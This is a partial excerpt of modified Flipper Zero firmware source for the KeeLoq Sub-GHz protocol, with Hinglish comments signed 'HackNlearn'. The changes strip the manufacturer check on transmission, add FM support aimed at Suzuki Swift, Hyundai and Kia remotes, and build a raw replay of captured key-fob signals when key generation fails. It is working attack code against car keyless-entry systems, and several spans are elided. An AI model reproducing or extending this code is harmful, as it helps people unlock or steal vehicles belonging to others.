...
// ============================================================
// HackNlearn: FM476 flag added — Suzuki Swift / Hyundai / Kia
// Original: SubGhzProtocolFlag_AM only
// Modified: FM flag bhi add kiya taaki FM476 preset ke saath
//           ye protocol display aur use ho sake
// ============================================================
const SubGhzProtocol subghz_protocol_keeloq = {
    .name = SUBGHZ_PROTOCOL_KEELOQ_NAME,
    .type = SubGhzProtocolTypeDynamic,
    .flag = SubGhzProtocolFlag_433 | SubGhzProtocolFlag_868 | SubGhzProtocolFlag_315 |
            SubGhzProtocolFlag_AM | SubGhzProtocolFlag_FM |  // HackNlearn: FM added for Swift
...
static bool subghz_protocol_keeloq_gen_data(SubGhzProtocolEncoderKeeloq* instance, uint8_t btn) {
    ...
    uint32_t decrypt = (uint32_t)btn << 28 |
                       (instance->generic.serial & 0x3FF) << 16 |
                       instance->generic.cnt;
    uint32_t hop = 0;
    uint64_t man = 0;
    int res = 0;
    ...
    if(hop) {
        ...
        // ============================================================
        // HackNlearn: "Unknown" manufacturer ke saath bhi TX allow karo
        // Original: instance->manufacture_name = "Unknown" set hoti thi
        //           aur false return hota tha — TX fail
        // Modified: Agar koi bhi keystore match nahi hua toh bhi
        //           raw data as-is transmit karo (captured signal replay)
        // ============================================================
        FURI_LOG_W(TAG, "HackNlearn: No mfr key match — using raw data for TX");
...
SubGhzProtocolStatus
    ...
    do {
        ...
        // ============================================================
        // HackNlearn: MANUFACTURER RESTRICTION REMOVED
        //
        // Original code (HATAO):
        ...
        //
        // HackNlearn change:
        //   Koi bhi manufacturer allow hai — Suzuki, Hyundai, Kia,
        //   Toyota, Honda, Unknown sab TX kar sakte hain.
        //   Agar keystore mein mfr key nahi hai toh "Unknown" ke
        //   saath bhi TX proceed karega (raw captured data replay).
        // ============================================================
        FURI_LOG_I(TAG, "HackNlearn KeeLoq TX — Manufacturer: %s", instance->manufacture_name);
        ...
        if(!subghz_protocol_encoder_keeloq_get_upload(instance, instance->generic.btn)) {
            // ============================================================
            // HackNlearn: gen_data fail hone pe bhi TX try karo
            // Captured raw .sub file ka data directly use karenge
            // ============================================================
            FURI_LOG_W(TAG, "HackNlearn: gen_data failed — attempting raw key TX");
            // Raw data already instance->generic.data mein hai captured se
            // Upload manually build karo current data se
            size_t index = 0;
            size_t size_upload =
                11 * 2 + 2 + (instance->generic.data_count_bit * 2) + 4;
            if(size_upload <= instance->encoder.size_upload) {
                instance->encoder.size_upload = size_upload;
                // Header
                for(uint8_t i = 11; i > 0; i--) {
                    instance->encoder.upload[index++] = level_duration_make(
                        true, (uint32_t)subghz_protocol_keeloq_const.te_short);
                    instance->encoder.upload[index++] = level_duration_make(
                        false, (uint32_t)subghz_protocol_keeloq_const.te_short);
                }
                instance->encoder.upload[index++] = level_duration_make(
                    true, (uint32_t)subghz_protocol_keeloq_const.te_short);
                instance->encoder.upload[index++] = level_duration_make(
                    false, (uint32_t)subghz_protocol_keeloq_const.te_short * 10);
                // Data bits
                for(uint8_t i = instance->generic.data_count_bit; i > 0; i--) {
                    if(bit_read(instance->generic.data, i - 1)) {
                        instance->encoder.upload[index++] = level_duration_make(
                            true, (uint32_t)subghz_protocol_keeloq_const.te_short);
                        instance->encoder.upload[index++] = level_duration_make(
                            false, (uint32_t)subghz_protocol_keeloq_const.te_long);
                    } else {
                        instance->encoder.upload[index++] = level_duration_make(
                            true, (uint32_t)subghz_protocol_keeloq_const.te_long);
                        instance->encoder.upload[index++] = level_duration_make(
                            false, (uint32_t)subghz_protocol_keeloq_const.te_short);
                    }
                }
                ...
                instance->encoder.upload[index++] = level_duration_make(
                    true, (uint32_t)subghz_protocol_keeloq_const.te_short);
                instance->encoder.upload[index++] = level_duration_make(
                    false, (uint32_t)subghz_protocol_keeloq_const.te_short * 40);
                // TX chalega raw data se
                FURI_LOG_I(TAG, "HackNlearn: Raw key TX ready — %d bits",
        ...
        // ============================================================
        // HackNlearn: Rolling counter increment log
        // TX ke baad counter value log karo debug ke liye
        // ============================================================
        FURI_LOG_I(TAG, "HackNlearn: TX ready — Serial:0x%07lX Cnt:%04lu Btn:0x%X",
